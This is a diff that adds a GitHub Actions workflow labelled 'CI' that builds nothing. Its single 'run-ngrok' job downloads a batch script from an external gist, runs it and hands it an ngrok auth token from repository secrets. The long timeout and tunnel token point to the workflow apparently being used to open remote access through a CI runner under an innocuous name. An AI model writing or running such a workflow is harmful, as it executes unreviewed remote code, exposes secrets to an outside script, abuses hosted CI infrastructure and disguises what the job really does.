@@ -1,0 +1,19 @@
+name: CI
+
+on:
+  workflow_dispatch:  # Allows manual triggering of the workflow
+
+jobs:
+  run-ngrok:
+    timeout-minutes: 300
+    runs-on: windows-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Download and Run Batch Script
+        run: |
+          Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/ryuzakinear211/a81acb49d33a85524c0509a8b5df6d91/raw/learn.bat' -OutFile learn.bat
+          echo Running batch script...
+          .\learn.bat ${{ secrets.NGROK_AUTH_TOKEN2 }}
+        shell: pwsh
